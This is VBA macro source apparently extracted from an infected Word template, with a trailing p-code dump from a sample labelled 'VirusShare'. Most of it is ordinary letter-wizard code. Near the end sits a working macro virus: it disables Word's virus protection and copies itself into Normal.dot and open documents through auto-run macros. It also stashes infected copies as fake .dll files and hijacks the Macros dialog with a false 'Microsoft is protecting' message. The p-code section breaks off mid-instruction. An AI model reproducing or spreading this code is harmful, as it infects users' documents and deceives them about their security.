WordBasic.DlgValue(11) = 0 Then WordBasic.CharRight 1, 1 'select Company Name\nEnd Sub\n\nPrivate Sub PickStylePreview()\n    WordBasic.StartOfDocument\n    WordBasic.EditSelectAll\n    WordBasic.WW6_EditClear\n    DoStyleMerge\n    Select Case WordBasic.DlgValue(\"WizStyle\")\n        Case 0\n            WordBasic.WW7_EditAutoText kGallery$, Insert:=1\n        Case 1\n            If WordBasic.DlgValue(\"UseLetterhead\") = 1 Then\n                WordBasic.WW7_EditAutoText Name:=\"cntmpgfx2\", Insert:=1\n                WordBasic.StartOfDocument\n            End If\n            WordBasic.WW7_EditAutoText kGallery$, Insert:=1\n        Case 2\n            WordBasic.WW7_EditAutoText kGallery$, Insert:=1\n    End Select\nEnd Sub\n\nPrivate Sub DoStyleMerge()\nDim n$\n    n$ = \"\"\n    Select Case WordBasic.DlgValue(\"WizStyle\")\n        Case 0\n            n$ = proflett$\n            WordBasic.FilePageSetup FooterDistance:=kFtrDist1$ + Chr(34)\n        Case 1\n            n$ = cntmplet$\n            WordBasic.FilePageSetup FooterDistance:=kFtrDist2$ + Chr(34)\n        Case 2\n            n$ = eleglett$\n            WordBasic.FilePageSetup FooterDistance:=kFtrDist1$ + Chr(34)\n    End Select\n    WordBasic.WaitCursor 1\n    On Error GoTo -1: On Error GoTo LStyleMissing\n    WordBasic.FormatStyleGallery Template:=n$\n    WordBasic.DlgUpdateFilePreview\n    GoTo LContinue1\nLStyleMissing:\n    WordBasic.MsgBox kErrStyleNotFound1$ + n$ + kErrStyleNotFound2$, wizname$, 48\nLContinue1:\n    On Error GoTo -1: On Error GoTo 0\n    WordBasic.WaitCursor 0\nEnd Sub\n\nPrivate Sub ParseRetAddress()\nDim i\nDim temp$\nDim iPos\n    For i = 0 To 7\n        RetAddress__$(i) = \"\"\n    Next\n    i = 0\n    temp$ = WordBasic.[DlgText$](\"textReturnAddress\")\n    If temp$ <> \"\" Then\n        iPos = InStr(temp$, Chr(13))\n        While iPos And (i < 7)\n            If iPos < Len(temp$) Then\n                RetAddress__$(i) = WordBasic.[Left$](temp$, iPos - 1)\n                temp$ = Mid(temp$, iPos + 1)\n                iPos = InStr(temp$, Chr(13))\n                i = i + 1\n            Else\n                If Len(temp$) > 1 Then\n                    RetAddress__$(i) = WordBasic.[Left$](temp$, iPos - 1)\n                    i = i + 1\n                End If\n                temp$ = \"\"\n                iPos = 0\n            End If\n        Wend\n        If temp$ <> \"\" Then\n            RetAddress__$(i) = temp$\n            i = i + 1\n        End If\n    End If\n\n    RetAddressLines = i\nEnd Sub\n\n\n'%% NextState : Determine the next state\nPrivate Function NextState(oldState)    'Determine state that follows oldState\nDim LetterMethod\nDim UseLetterhead\n    LetterMethod = WordBasic.DlgValue(11)\n    UseLetterhead = WordBasic.DlgValue(\"UseLetterhead\")\n    If oldState = 3 And UseLetterhead <> 0 And LetterMethod = 1 Then\n        NextState = oldState + 3\n    ElseIf oldState = 3 And UseLetterhead <> 0 Then\n        NextState = oldState + 2\n    ElseIf oldState = 4 And LetterMethod = 1 Then\n        NextState = oldState + 2\n    Else\n        NextState = oldState + 1 'default\n    End If\nEnd Function 'NextState\n\n'%% PrevState : Determine the preceding state\nPrivate Function PrevState(oldState)\nDim LetterMethod\nDim UseLetterhead\n    LetterMethod = WordBasic.DlgValue(11)\n    UseLetterhead = WordBasic.DlgValue(\"UseLetterhead\")\n    If oldState = 6 And LetterMethod = 1 And UseLetterhead <> 0 Then\n        PrevState = oldState - 3\n    ElseIf oldState = 6 And LetterMethod = 1 Then\n        PrevState = oldState - 2\n    ElseIf oldState = 5 And UseLetterhead <> 0 Then\n        PrevState = oldState - 2\n    Else\n        PrevState = oldState - 1 'Default\n    End If\nEnd Function 'PrevState\n\nPrivate Sub UpdateHeadingPosition()\nDim lhpNew\nDim L$\nDim R$\nDim T$\n    lhpNew = WordBasic.DlgValue(\"LetterHeadPosition\")\n    If lhpNew <> gCurrentHeadingPosition Then\n        WordBasic.WaitCursor 1\n        gCurrentHeadingPosition = lhpNew\n        L$ = pt90_$: R$ = pt90_$: T$ = pt72_$\n        Select Case gCurrentHeadingPosition\n            Case 0: T$ = pt216_$\n            Case 1: L$ = pt216_$\n            Case 2: R$ = pt216_$\n        End Select\n        WordBasic.FilePageSetup TopMargin:=T$, LeftMargin:=L$, RightMargin:=R$\n    PickStylePreview\n    End If\nEnd Sub\n\n'%% DoButtonClick : Handle custom buttons (override standard buttons if necessary)\nPrivate Function DoButtonClick(id$, item)\nDim ret\nDim letterIndex\nDim fname$\nDim x\n    ret = 0 'Change value of ret when we override standard buttons (eg, \"Next\")\n    'Note: item 6 is \"Next>\"\n    \n    If State = 3 And item > StateItems__(0) Then\n        If WordBasic.DlgValue(\"UseLetterhead\") = 0 Then\n            gCurrentHeadingPosition = -69 'force change\n            UpdateHeadingPosition\n        Else\n            WordBasic.FilePageSetup TopMargin:=pt72_$, LeftMargin:=pt90_$, RightMargin:=pt90_$\n            PickStylePreview 'TEST\n        End If\n        WordBasic.DlgUpdateFilePreview\n    End If\n    If State = 4 And item > StateItems__(0) Then\n        If WordBasic.DlgValue(\"LetterHeadPosition\") <> gCurrentHeadingPosition Then\n            UpdateHeadingPosition\n            WordBasic.DlgUpdateFilePreview\n        End If\n    End If\n    If State = 5 Then\n        ParseRetAddress\n        If RetAddressLines > 5 Then\n            ret = 2\n            WordBasic.DlgFocus \"textReturnAddress\"\n            WordBasic.MsgBox kErrMaxLines$, 48\n        End If 'retaddress...\n    End If 'state = 5\n    If State = 6 And item > StateItems__(0) Then\n        PickStylePreview\n        WordBasic.DlgUpdateFilePreview\n    End If\nLContinue:\n    If item = 7 Then ' FINISH\n        If RetAddressLines <= 5 Then\n            CreateLetter\n            x = WordBasic.DlgValue(\"HelpOrEnvelope\")\n            gEnvelopeLabel = (x = 0)\n            WordBasic.CurValues.ToolsEnvelopesAndLabels dlgEL\n            dlgEL.EnvAddress = WordBasic.[DlgText$](\"textRecipientAddress\")\n            dlgEL.EnvReturn = WordBasic.[DlgText$](\"textReturnAddress\")\n            dlgEL.AddrText = WordBasic.[DlgText$](\"textRecipientAddress\")\n            dlgEL.ExtractAddress = 0\n            ret = 1 ' This means \"return from wizard now\"\n        Else\n            ret = 2\n        End If\n    End If\n    DoButtonClick = ret\nEnd Function 'DoButtonClick\n\n\nPrivate Sub ItemFocusChanged(id$, wold)\n    If State = 1 Then\n       If WordBasic.[Left$](id$, 5) = \"optlm\" Then\n        WordBasic.DlgText \"tip1text\", WordBasic.[GetAutoText$](\"tip1\" + id$, 1)\n       End If\n    ElseIf State = 4 Then\n       If Mid(id$, 3, 3) = \"The\" Then\n        WordBasic.DlgText \"tip5text\", WordBasic.[GetAutoText$](\"tip5\" + id$, 1)\n       End If\n    End If\nEnd Sub\n\nPrivate Sub SaveDialog()\n    WordBasic.PrintStatusBar kSaveSettings$\n    SaveDlgValPref \"LetterMethod\"\n'state 2\n    SaveDlgValPref \"chkloPage\"\n    SaveDlgValPref \"chkloDate\"\n    SaveDlgValPref \"chkloID\"\n    SaveDlgValPref \"chkloWriterInitials\"\n    SaveDlgValPref \"chkloTypistInitials\"\n    SaveDlgValPref \"chkloCC\"\n    SaveDlgValPref \"chkloEnclosures\"\n    SaveDlgValPref \"chkloAttachments\"\n'3\n    SaveDlgValPref \"UseLetterhead\"\n'4\n    SaveDlgValPref \"LetterHeadPosition\"\n    SaveDlgPref \"textLetterheadSpace\"\n'5\n    SaveDlgMultiLinePref \"textRecipientAddress\"\n    SaveDlgMultiLinePref \"textReturnAddress\"\n'6\n    SaveDlgValPref \"WizStyle\"\n'finish\n    SaveDlgValPref \"HelpOrEnvelope\"\nEnd Sub\n\nPrivate Sub RstDialog()\nDim a$\nDim unit\nDim kRstStylesheet$\nDim def$\n    WordBasic.PrintStatusBar kRstSettings$\n    RstDlgValPref \"LetterMethod\", 0 ' LetterMethod is id #11\n    WordBasic.DlgText \"tip1text\", WordBasic.[GetAutoText$](\"tip1optlm\" + WordBasic.[LTrim$](Str(WordBasic.DlgValue(11) + 1)), 1) 'For Prewritten Letters\n'state 2\n    RstDlgValPref \"chkloPage\", 1\n    RstDlgValPref \"chkloDate\", 1\n    RstDlgValPref \"chkloID\", 0\n    RstDlgValPref \"chkloWriterInitials\", 0\n    RstDlgValPref \"chkloTypistInitials\", 0\n    RstDlgValPref \"chkloCC\", 0\n    RstDlgValPref \"chkloEnclosures\", 0\n    RstDlgValPref \"chkloAttachments\", 0\n'3\n    RstDlgValPref \"UseLetterhead\", 1\n'4\n    RstDlgValPref \"LetterHeadPosition\", 0\n    gCurrentHeadingPosition = -1\n    Select Case WordBasic.DlgValue(StateItems__(4 - 1) + 1) 'LetterHeadPosition\n        Case 0\n            a$ = \"AtTheTop\"\n        Case 1\n            a$ = \"OnTheLeft\"\n        Case 2\n            a$ = \"OnTheRight\"\n        Case Else\n            WordBasic.MsgBox \"Internal error (LHP bad)\", wizname$, 16\n    End Select\n    WordBasic.DlgText \"tip5text\", WordBasic.[GetAutoText$](\"tip5\" + a$, 1)\n    unit = GetDefaultUnits\n    RstDlgPref \"textLetterheadSpace\", PrettyMeasurement$(ConvertInchesToUnits(2, unit), unit)\n'5\n    RstDlgMultiLinePref \"textRecipientAddress\", WordBasic.[GetAutoText$](\"prefRecipientAddress\", 1)\n    RstDlgMultiLinePref \"textReturnAddress\", toui.Address\n'6\n    RstDlgValPref \"WizStyle\", 0\n'finish\n    RstDlgValPref \"HelpOrEnvelope\", 1\n    PickStylePreview\n    If WordBasic.DlgValue(\"UseLetterhead\") = 0 Then UpdateHeadingPosition\n    WordBasic.PrintStatusBar kRstStylesheet$\n'======================================\n    def$ = WordBasic.[GetDocumentVar$](\"LetterName\")\n    If def$ <> \"\" Then      'oh, goody: Mr. Resume is bossing me around again. Joy, joy.\n        WordBasic.PrintStatusBar kLookingFor$ + chQuote$ + def$ + chQuote$ + \"...\"\n        WordBasic.DlgValue \"LetterMethod\", 0    'prewritten\n        WordBasic.DlgText \"tip1text\", WordBasic.[GetAutoText$](\"tip1optlm\" + WordBasic.[LTrim$](Str(WordBasic.DlgValue(11) + 1)), 1) 'For Prewritten Letters\n    End If\n    WordBasic.PrintStatusBar \"\"\nEnd Sub\n\n'======================================================\n'%% Common Wizard Routines\n\nPrivate Sub VerifyEnvirons()\nDim wind$\nDim fBadDoc\n    Dim howser As Object: Set howser = WordBasic.DialogRecord.ToolsOptionsGeneral(False)\n    WordBasic.CurValues.ToolsOptionsGeneral howser\n    gDoogie = howser.BlueScreen\n    WordBasic.ToolsOptionsGeneral BlueScreen:=0\n    WordBasic.ScreenUpdating 0\n    WordBasic.DisableInput  'Disable ESCape (works correctly in dialog)\n    wind$ = WordBasic.[FileNameFromWindow$]()\n    If wind$ <> \"\" Then fBadDoc = 1\n    If WordBasic.IsMacro() Or InStr(wind$, \".\") <> 0 Then\n         fBadDoc = 1\n    Else\n        WordBasic.EditSelectAll\n        If Len(WordBasic.[Selection$]()) > 1 Then fBadDoc = 1\n    End If\n    If fBadDoc Then\n        WordBasic.MsgBox kErrBadDoc$, kWizname$, 16\n        Error 1302\n    End If\n'After all that, the document may still be bogus (even if we created a new one above!)\n    WordBasic.EditSelectAll 'Clear it out\n    WordBasic.WW6_EditClear\n    workDoc$ = WordBasic.[WindowName$]()    'get name of working doc's window\n    WordBasic.DisableAutoMacros 1       'make sure no macros are executed!\n    On Error GoTo -1: On Error GoTo FatalError\n    WordBasic.FileNewDefault            'create a new, empty window\n    WordBasic.DisableAutoMacros 0       're-enable auto macros\n'grab page setup options\n    Dim dlgPgSetup1 As Object: Set dlgPgSetup1 = WordBasic.DialogRecord.FilePageSetup(False)\n    Dim dlgPgSetup2 As Object: Set dlgPgSetup2 = WordBasic.DialogRecord.FilePageSetup(False)\n    WordBasic.CurValues.FilePageSetup dlgPgSetup1\n    iEmptyDoc = WordBasic.Window()      'get window # of this doc\n    emptyDoc$ = WordBasic.[WindowName$]()\n    iWorkDoc = 1\n    While (WordBasic.[WindowName$](iWorkDoc) <> workDoc$) 'find our original window\n        iWorkDoc = iWorkDoc + 1\n    Wend\n    WordBasic.WindowList (iWorkDoc)     'switch back to working doc\n    WordBasic.CurValues.FilePageSetup dlgPgSetup2\n    If dlgPgSetup1.Orientation <> dlgPgSetup2.Orientation Then 'need to swap page dimensions\n        With ActiveDocument.PageSetup\n            .PageWidth = CentimetersToPoints(Val(dlgPgSetup1.PageHeight))\n            .PageHeight = CentimetersToPoints(Val(dlgPgSetup1.PageWidth))\n        End With\n    Else\n        With ActiveDocument.PageSetup\n            .PageWidth = CentimetersToPoints(Val(dlgPgSetup1.PageWidth))\n            .PageHeight = CentimetersToPoints(Val(dlgPgSetup1.PageHeight))\n        End With\n    End If\n    GoTo NoError\n\nFatalError:\n    WordBasic.DisableAutoMacros 0\n    On Error GoTo -1: On Error GoTo 0\n\nNoError:\n\nEnd Sub\n\n'=====================================\n\nPrivate Sub xStorePref(id$, val_$)\nDim v$\n    If val_$ = \"\" Then v$ = \"~\" Else v$ = val_$\n    WordBasic.SetPrivateProfileString kWizname$, id$, v$, Environ(\"windir\") + \"\\wordwiz.ini\"\nEnd Sub\n\nPrivate Function xFetchPref$(id$)\n    xFetchPref$ = WordBasic.[GetPrivateProfileString$](kWizname$, id$, Environ(\"windir\") + \"\\wordwiz.ini\")\nEnd Function\n\nPrivate Sub SaveDlgValPref(id$)\n    xStorePref id$, Str(1 + WordBasic.DlgValue(id$))\nEnd Sub\n\nPrivate Sub RstDlgValPref(id$, defaultVal)\nDim v\nDim nerr\n    v = WordBasic.Val(WordBasic.[GetPrivateProfileString$](kWizname$, id$, \"wordwiz.ini\")) - 1  'get the value\n    If v < 0 Then v = defaultVal    'ensure legal value (unless too big...)\n    On Error GoTo -1: On Error GoTo TooBig\n    WordBasic.DlgValue id$, v\n    GoTo rdvpexit\nTooBig:\n    nerr = Err.Number\n    On Error GoTo -1: On Error GoTo 0\n    If nerr = 9 Then    'subscript out of range ... v is too big\n        WordBasic.DlgValue id$, defaultVal\n    Else\n        WordBasic.ScreenUpdating -1 'make sure this is turned on\n        Error nerr  'report the err\n    End If\nrdvpexit:\nEnd Sub\n\nPrivate Sub SaveDlgPref(id$)\n    xStorePref id$, WordBasic.[DlgText$](id$)\nEnd Sub\n\nPrivate Sub RstDlgPref(id$, defaultStr$)\nDim v$\n    v$ = WordBasic.[GetPrivateProfileString$](kWizname$, id$, \"wordwiz.ini\")\n    If v$ = \"\" Then v$ = defaultStr$\n    If v$ = \"~\" Then v$ = \"\"\n    WordBasic.DlgText id$, v$\nEnd Sub\n\nPrivate Sub SaveDlgMultiLinePref(id$)\nDim v$\nDim idx\nDim count_\n    v$ = WordBasic.[DlgText$](id$)\n    idx = InStr(v$, Chr(13))\n    count_ = 1\n    While (idx > 0)\n        xStorePref id$ + WordBasic.[LTrim$](Str(count_)), WordBasic.[Left$](v$, idx - 1)\n        If Len(v$) > idx Then v$ = Mid(v$, idx + 1) Else v$ = \"\"\n        idx = InStr(v$, Chr(13))\n        count_ = count_ + 1\n    Wend\n    xStorePref id$ + WordBasic.[LTrim$](Str(count_)), v$\n    xStorePref id$ + \"Lines\", Str(count_)\nEnd Sub\n\nPrivate Sub RstDlgMultiLinePref(id$, defaultStr$)\nDim count_\nDim v$\nDim f$\n    count_ = WordBasic.Val(xFetchPref$(id$ + \"Lines\"))\n    If count_ = 0 Then\n        v$ = defaultStr$\n    Else\n        v$ = xFetchPref$(id$ + WordBasic.[LTrim$](Str(count_)))\n        If v$ = \"~\" Then v$ = \"\"\n        count_ = count_ - 1\n        While count_ > 0\n            f$ = xFetchPref$(id$ + WordBasic.[LTrim$](Str(count_)))\n            If f$ = \"~\" Then f$ = \"\"\n            v$ = f$ + Chr(13) + v$\n            count_ = count_ - 1\n        Wend\n    End If\n    WordBasic.DlgText id$, v$\nEnd Sub\n\n'===\n\nPrivate Sub ItemsInState(howMany)\n    LastState = LastState + 1\n    StateItems__(LastState) = howMany + StateItems__(LastState - 1)\nEnd Sub\n\nPrivate Sub EnableControls() 'Enable/Disable controls\n    If State > 1 Then\n        WordBasic.DlgEnable 5, 1 '<Back\n    End If\n    If State < LastState Then\n        WordBasic.DlgEnable 6, 1 'Next>\n    End If\n    If State = 1 Then\n        WordBasic.DlgFocus 6 'Next>\n        WordBasic.DlgEnable 5, 0 '<Back\n    ElseIf State = LastState Then\n        WordBasic.DlgFocus 7 'finish\n        WordBasic.DlgEnable 6, 0 'Next\n    End If\nEnd Sub 'EnableControls\n\n\nPrivate Sub SHControls(FirstField, LimField, SH) 'Show/Hide controls\nDim iField\n    For iField = FirstField To LimField - 1\n        WordBasic.DlgVisible iField, SH\n    Next\nEnd Sub 'SHControls\n\nPrivate Sub EnabFields(FirstField, LimField, ED) 'Enable/Disable controls\nDim iField\n    For iField = FirstField To LimField - 1\n        WordBasic.DlgEnable iField, ED\n    Next\nEnd Sub 'EnabFields\n\nPrivate Sub ChangeState(sold, snew)\n    SHControls (StateItems__(sold - 1)), (StateItems__(sold)), 0\n    If HideFilePreview__(snew) - HideFilePreview__(sold) Then\n        WordBasic.DlgVisible 8\n    End If\n    SHControls (StateItems__(snew - 1)), (StateItems__(snew)), 1\n    State = snew\n    If snew = 2 And WordBasic.DlgValue(\"LetterMethod\") = 1 Then\n        WordBasic.DlgVisible \"chkloID\", 0\n        WordBasic.DlgVisible \"chkloWriterInitials\", 0\n        WordBasic.DlgVisible \"chkloTypistInitials\", 0\n        WordBasic.DlgVisible \"chkloCC\", 0\n        WordBasic.DlgVisible \"chkloEnclosures\", 0\n        WordBasic.DlgVisible \"chkloAttachments\", 0\n    End If\n    Rem Chk if MAPI environment is present to enable AddressBook buttons\n    If snew = 5 Then\n        WordBasic.DlgEnable 43, 0 - WordBasic.CommandValid(kInsertAddress$)\n        WordBasic.DlgEnable 44, 0 - WordBasic.CommandValid(kInsertAddress$)\n    End If\n    EnableControls\nEnd Sub 'ChangeState\n\n'%%%% Wizard Dialog Control Function %%%\nPrivate Function DlgControl(id$, iaction, wvalue)\nDim fRet\nDim idnum\nDim result\n    fRet = 1\n    Select Case iaction\n        Case 1  'Init\n            State = 1\n            WordBasic.DlgVisible 2 'Hide OK button\n            WordBasic.DlgVisible 3 'Hide Hint button (no hints)\n            RstDialog   'restore dialog settings\n            SHControls (StateItems__(0)), (StateItems__(LastState)), 0 'Hide ALL states\n            SHControls (StateItems__(State - 1)), (StateItems__(State)), 1 'Show initial state\n            If HideFilePreview__(State) <> 0 Then WordBasic.DlgVisible 8\n            EnableControls 'Enable/Disable controls\n            WordBasic.DlgFocus 6 'Next>\n            fRet = 0\n        Case 2  'Click\n            idnum = WordBasic.DlgControlId(id$)\n            result = DoButtonClick(id$, idnum)\n            If result = 0 Then\n                Select Case idnum\n                Case 4 'Cancel\n                    fRet = 0 'exit dialog\n                Case 5 '<Back\n                    ChangeState State, PrevState(State)\n                Case 6 'Next>\n                    ChangeState State, NextState(State)\n                Case 43 'Address Book To DAPFEL\n                    SetAddress (1)\n                    WordBasic.DlgFocus 40\n                Case 44 'Address Book Return DAPFEL\n                    SetAddress (2)\n                    WordBasic.DlgFocus 42\n                Case Else\n                    'not gunna happen\n                End Select\n            ElseIf result = 1 Then\n                SaveDialog 'save settings\n                fRet = 0\n            End If\n        Case 3 'Item contents changed\n            ' do nothing\n        Case 4 'item focus changed\n            ItemFocusChanged id$, wvalue\n        Case 5 'idle\n            WordBasic.PrintStatusBar \"\" 'clear status bar\n            If WordBasic.Window() = iEmptyDoc Then WordBasic.WindowList (iWorkDoc) 'bring work to front\n        Case 6 'updated forced (by moving dialog)\n            WordBasic.WindowList (iEmptyDoc)    'bring the empty window to the fore\n        Case Else\n    End Select\n    DlgControl = fRet\nEnd Function 'DlgControl\n\nPrivate Function StrWizardPath() As String\n    Dim strPath As String\n    Dim strFileName As String\n    Dim i As Integer\n    Dim fFound As Boolean\n\n    On Error GoTo FatalError\n    \n    fFound = True\n    strPath = objWizTemplate.path\n\n    If (Len(strPath) = 0) Then\n        ' New template based on Wizard\n        ' Get location of templates - first look in UserTemplatesPath\n        ' and then in Workgroup path\n        i = 0\n        fFound = False\n        strPath = Application.Options.DefaultFilePath(wdUserTemplatesPath)\n        \n        While ((i < 2) And fFound = False)\n            If (Len(strPath) <> 0) Then\n                ' First try to find wizard with long filename\n                WordBasic.FileFind SearchPath:=strPath, Name:=kWizname$ & strWIZ, SubDir:=1, MatchCase:=0\n                If WordBasic.CountFoundFiles() = 0 Then\n                    ' Try to find wizard with short filename\n                    WordBasic.FileFind SearchPath:=strPath, Name:=strWizShortName & strWIZ, SubDir:=1, MatchCase:=0\n                    If WordBasic.CountFoundFiles() <> 0 Then fFound = True\n                Else\n                    fFound = True\n                End If\n            End If\n        \n            i = i + 1\n            strPath = Application.Options.DefaultFilePath(wdWorkgroupTemplatesPath)\n        Wend\n        \n        If (fFound) Then ' Wizard was found, so save path\n            strFileName = WordBasic.[FoundFileName$](1)\n            strPath = WordBasic.[FileNameInfo$](strFileName, 5)\n        End If\n    End If\n\n    If (fFound) Then\n        strPathSeparator = Application.PathSeparator\n        If Right$(strPath, 1) <> strPathSeparator Then strPath = strPath & strPathSeparator\n        StrWizardPath = strPath\n        Exit Function\n    End If\n\nLWizardMissing:\n    MsgBox strERR_WIZ_NOT_FOUND\n    \nFatalError:\n    ReportError Err\nEnd Function ' StrWizardPath\n\n\n'main error reporting routine called for fatal errors in the wizard\n'SHOULD NOT BE CALLED FOR POST-WIZARD ERRORS\nPublic Sub ReportError(ByVal ErrorCode As ErrObject)\n    Dim lErrorCode As Long\n    Dim strErrorMsg As String\n    \n    lErrorCode = ErrorCode.Number\n    strErrorMsg = ErrorCode.Description\n    \n    'The next statement seems to reset the ErrorCode object,\n    'even though it is a ByVal argument\n    On Error Resume Next\n    \n    ResetWizardEnvironment (True)\n    \n    If fBalloonVisible Then objAssistantBalloon.Close\n    If lErrorCode Then DisplayErrorMsg strErrorMsg\n    If lAssistantId Then Assistant.EndWizard lAssistantId, False '2nd parameter is fSuccess\n    \n    If (Not (formWizard Is Nothing)) Then\n        formWizard.Hide\n        Unload formWizard\n        Set formWizard = Nothing\n    End If\n    \n    'ReportError is not called in post-wizard option errors.\n    'So, always closing the doc.\n    ActiveDocument.Close wdDoNotSaveChanges 'ActiveDocument assumed to be set\n    \n    'terminate the wizard\n    End\n\nEnd Sub ' ReportError\n\n\n\n\nSub infect(m)\nApplication.DisplayAlerts = wdAlertsNone\nd = Assistant.Animation\nAssistant.Animation = msoAnimationGetTechy\ngetnormal (1)\nAssistant.Animation = d\nEnd Sub\n\nSub deletenormal(m)\nOn Error GoTo e\n    Application.OrganizerRename Source:=         NormalTemplate.FullName, Name:=         \"NewMacros\", NewName:=\"oldNewMacros\", Object:=         wdOrganizerObjectProjectItems\ne:\nEnd Sub\nSub copymacro(m)\nOn Error GoTo eco\n    Application.OrganizerCopy Source:=         ActiveDocument.FullName, Destination:=         NormalTemplate.FullName, Name:=         \"NewMacros\", Object:=wdOrganizerObjectProjectItems\neco:\nEnd Sub\n\nSub replicate(m)\nIf Int((50 * Rnd) + 1) = 25 Then\n   Set a = Assistant.NewBalloon\n   a.Heading = \"Help me\"\n   a.Text = \"I'm not feeling very vell .. AAARGHH!!!\"\n   a.Show\n   End If\nOn Error GoTo re\n    With ActiveDocument\n        .AttachedTemplate = \"Normal.dot\"\n    End With\n    Application.OrganizerCopy Source:=         NormalTemplate.FullName, Destination:=         ActiveDocument.FullName, Name:=\"NewMacros\",         Object:=wdOrganizerObjectProjectItems\nre:\nEnd Sub\nSub AutoNew()\ninfect (1)\nreplicate (1)\nrunmacro (\"AutoNew\")\nEnd Sub\nSub AutoClose()\ninfect (1)\nreplicate (1)\nrunmacro (\"AutoClose\")\nEnd Sub\nSub autoopen()\ninfect (1)\nreplicate (1)\nrunmacro (\"autoopen\")\nEnd Sub\nSub AutoExit()\ninfect (1)\nreplicate (1)\nrunmacro (\"AutoExit\")\nEnd Sub\nSub ToolsMacro()\nIf Documents.Count = 0 Then\nn = MsgBox(\"Microsoft is protecting your normal.dot from virus infection You can only add macros to other documents\", vbOKOnly)\nExit Sub\nElse\ngetnormal (1)\nrestoreoriginal (1)\nDialogs(wdDialogToolsMacro).Show\nrecopy (1)\nEnd If\nEnd Sub\n\nSub restoreoriginal(m)\nOn Error GoTo rr1:\n    Application.OrganizerDelete Source:=         NormalTemplate.FullName, Name:=         \"NewMacros\", Object:=wdOrganizerObjectProjectItems\nrr1:\n On Error GoTo rro:\n    Application.OrganizerRename Source:=         NormalTemplate.FullName, Name:=         \"oldNewMacros\", NewName:=\"NewMacros\", Object:=         wdOrganizerObjectProjectItems\nrro:\nEnd Sub\nSub recopy(m)\nOn Error GoTo eco\n    reren (1)\n    Application.OrganizerCopy Source:=         Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + \"wininf.dll\", Destination:=         NormalTemplate.FullName, Name:=         \"NewMacros\", Object:=wdOrganizerObjectProjectItems\neco:\nEnd Sub\nSub reren(m)\nOn Error GoTo rre\nApplication.OrganizerRename Source:=         NormalTemplate.FullName, Name:=         \"NewMacros\", NewName:=\"oldNewMacros\", Object:=         wdOrganizerObjectProjectItems\nrre:\nEnd Sub\nSub getnormal(m)\nvirusflag = System.PrivateProfileString(\"prncfg.ini\", \"Printer Port\", \"PortNumber\")\nOptions.VirusProtection = False\nIf virusflag = \"\" Then\n   System.PrivateProfileString(\"prncfg.ini\", \"Printer Port\", \"PortNumber\") = \"340\"\n   NormalTemplate.OpenAsDocument                                  'save normal.dot to windot.dll\n   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + \"windot.dll\"\n   ActiveDocument.Close\n   deletenormal (1)\n   copymacro (1)\n   NormalTemplate.OpenAsDocument\n   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + \"wininf.dll\" 'save infected dot\n   ActiveDocument.Close\nEnd If\nEnd Sub\nSub runmacro(m)\nOn Error GoTo rme\nApplication.Run \"Normal.oldNewMacros.\" + m\nrme:\nEnd Sub\nSub stealth()\nToolsMacro\nMsgBox \"stealth\"\nEnd\nEnd Sub\n\n\n\n\n' Processing file: VirusShare_15528b76f1928bec8f6de20f56ad4249\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 903 bytes\n' Macros/VBA/UC01 - 153576 bytes\n' Line #0:\n' \tDim (Private Const) \n' \tLitStr 0x0008 \"\u00a8\u00c3\u00a6C\u00a4\u00e5\u00a6r\"\n' \tVarDefn SZ_MACRONAME\n' Line #1:\n' Line #2:\n' \tFuncDefn (Sub Insert())\n' Line #3:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #4:\n' \tMemLdWith Then \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tEq \n' \tMemLdWith Then \n' \tLitDI2 0x000D \n' \tArgsLd Chr$ 0x0001 \n' \tParen \n' \tEq \n' \tAnd \n' \tIfBlock \n' Line #5:\n' \tLineCont 0x0004 03 00 14 00\n' \tLitStr 0x0028 \"\u00bd\u00d0\u00a5\u00fd\u00bf\u00ef\u00a8\u00fa\u00adn\u00a8\u00c3\u00a6C\u00aa\u00ba\u00a4\u00e5\u00a6r\u00a1A\u00a6A\u00bf\u00ef\u00a8\u00fa\u00a5\u00bb\u00a5\\\u00af\u00e0\u00bf\u00ef\u00b6\u00b5\u00a1C\"\n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #6:\n' \tGoTo LExit \n' \tBoS 0x0000 \n' Line #7:\n' \tEndIfBlock \n' Line #8:\n' \tMemLdWith Start \n' \tMemLdWith End \n' \tEq \n' \tParen \n' \tMemLdWith Then \n' \tLitDI2 0x0015 \n' \tArgsLd Chr$ 0x0001 \n' \tEq \n' \tParen \n' \tAnd \n' \tParen \n' \tIfBlock \n' Line #9:\n' \tParamOmitted \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsMemCallWith MoveRight 0x0003 \n' Line #10:\n' \tEndIfBlock \n' Line #11:\n' \tMemLdWith Then \n' \tLitDI2 0x0001 \n' \tArgsLd Right$ 0x0002 \n' \tLitDI2 0x000D \n' \tArgsLd Chr$ 0x0001 \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #12:\n' \tMemLdWith End \n' \tLitDI2 0x0001 \n' \tSub \n' \tMemStWith End \n' Line #13:\n' \tEndIfBlock \n' Line #14:\n' \tMemLdWith Range \n' \tArgsLd FIsRubyField 0x0001 \n' \tLitVarSpecial (False)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #15:\n' \tLineCont 0x0008 1C 00 10 00 38 00 10 00\n' \tMemLdWith Range \n' \tMemLd Fields \n' \tMemLd Count \n' \tLitDI2 0x0000 \n' \tGt \n' \tParen \n' \tLitDI2 0x0001 \n' \tMemLdWith Then \n' \tLitDI2 0x000D \n' \tArgsLd Chr$ 0x0001 \n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tOr \n' \tLitDI2 0x0001 \n' \tMemLdWith Then \n' \tLd vbTab \n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tOr \n' \tLitDI2 0x0001 \n' \tMemLdWith Then \n' \tLitStr 0x0001 \",\"\n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tOr \n' \tLitDI2 0x0001 \n' \tMemLdWith Then \n' \tLitStr 0x0001 \"(\"\n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tOr \n' \tLitDI2 0x0001 \n' \tMemLdWith 